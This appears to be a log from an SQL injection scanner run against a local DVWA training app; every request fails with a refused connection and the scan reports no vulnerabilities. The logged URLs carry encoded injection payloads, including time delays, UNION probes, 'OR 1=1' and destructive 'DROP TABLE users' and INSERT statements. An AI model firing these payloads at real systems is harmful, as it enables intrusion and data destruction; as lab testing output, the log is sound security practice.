[2026-04-07 07:35:05] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27%3B+WAITFOR+DELAY+%270%3A0%3A3%27--&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:35:05] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27%3B+WAITFOR+DELAY+%270%3A0%3A3%27-- (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:35:10] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27%3B+SELECT+SLEEP%283%29--&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:35:10] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27%3B+SELECT+SLEEP%283%29-- (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:35:15] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1%3B+SELECT+pg_sleep%283%29--&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:35:15] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=1%3B+SELECT+pg_sleep%283%29-- (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:35:19] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27+UNION+SELECT+NULL--&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:35:19] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27+UNION+SELECT+NULL-- (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:35:24] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27+UNION+SELECT+NULL%2CNULL--&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:35:24] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27+UNION+SELECT+NULL%2CNULL-- (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:35:28] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27+UNION+SELECT+NULL%2CNULL%2CNULL--&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:35:28] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27+UNION+SELECT+NULL%2CNULL%2CNULL-- (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:35:33] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27%3B+DROP+TABLE+users--&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:35:33] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27%3B+DROP+TABLE+users-- (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:35:37] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27%3B+INSERT+INTO+users+VALUES%281%29--&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:35:37] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27%3B+INSERT+INTO+users+VALUES%281%29-- (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:35:42] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27--&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:35:42] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27-- (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:35:46] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27%23&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:35:47] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27%23 (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:35:51] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27%2F%2A&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:35:51] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27%2F%2A (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:35:51] INFO     
=======================================================
[2026-04-07 07:35:51] INFO       SCAN COMPLETE
[2026-04-07 07:35:51] INFO       URLs scanned    : 1
[2026-04-07 07:35:51] INFO       Vulnerabilities : 0
[2026-04-07 07:35:51] INFO       Results saved   : sqli_results.json
[2026-04-07 07:35:51] INFO       Log saved       : sqli_scan.log
[2026-04-07 07:35:51] INFO     =======================================================
[2026-04-07 07:35:51] INFO     Scanning http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit | Parameters: ['id', 'Submit']
[2026-04-07 07:35:51] INFO     Scanning http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit | Parameters: ['id', 'Submit']
[2026-04-07 07:35:55] WARNING  Baseline fetch failed for http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:35:55] WARNING  Baseline fetch failed for http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:35:55] WARNING  Baseline fetch failed for http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:35:55] WARNING  Baseline fetch failed for http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:00] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:00] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:00] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27 (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:00] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27 (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:04] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27%27&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:04] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27%27&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:04] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27%27 (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:04] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27%27 (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:09] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27+OR+%271%27%3D%271 (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:09] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27+OR+%271%27%3D%271 (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:09] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27+OR+%271%27%3D%271&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
